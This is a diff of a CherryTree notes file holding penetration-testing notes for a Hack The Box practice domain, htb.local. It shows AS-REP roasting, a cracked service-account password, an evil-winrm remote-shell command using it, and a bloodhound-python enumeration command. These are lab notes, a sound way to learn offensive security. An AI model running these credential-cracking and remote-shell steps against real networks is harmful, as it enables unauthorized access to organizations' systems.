@@ -17,7 +17,7 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1696109917">
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1696627148">
       <node name="Nmap" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696025354" ts_lastsave="1696109906">
         <rich_text justification="left"></rich_text>
         <rich_text>
@@ -97,6 +97,7 @@ get all the users using </rich_text>
         <rich_text>
 
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 30 06:54:59 2023
 
 [34m =========================================( [0m[32mTarget Information[0m[34m )=========================================
@@ -11230,17 +11231,22 @@ userPrincipalName: andy@htb.local
 userPrincipalName: mark@htb.local
 </codebox>
       </node>
-      <node name="AS-RepRoasting" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696109917" ts_lastsave="1696369298">
+      <node name="AS-RepRoasting" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696109917" ts_lastsave="1696369312">
+        <rich_text justification="left"></rich_text>
         <rich_text>
 
 
 we can use this hash to get the password for user using john the ripper
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 now use evil-winrm to get a shell:
 
-evil-winrm -i 10.10.10.161 -u anirudh -p </rich_text>
+evil-winrm -i 10.10.10.161 -u </rich_text>
+        <rich_text foreground="#9755b3">svc</rich_text>
+        <rich_text>-alfresc -p </rich_text>
         <rich_text foreground="#5ebdab">"s3rvice"</rich_text>
         <rich_text> -s .
 </rich_text>
@@ -11266,6 +11272,16 @@ s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 </codebox>
+      </node>
+      <node name="PrivEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696627148" ts_lastsave="1696627769">
+        <rich_text>
+since we have credentials we will run the followig:
+
+
+
+
+</rich_text>
+        <codebox char_offset="55" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python2 bloodhound-python --dns-tcp -ns 10.10.10.161 -d htb.local -u ‘svc-alfresco’ -p ‘s3rvice’ -c all</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
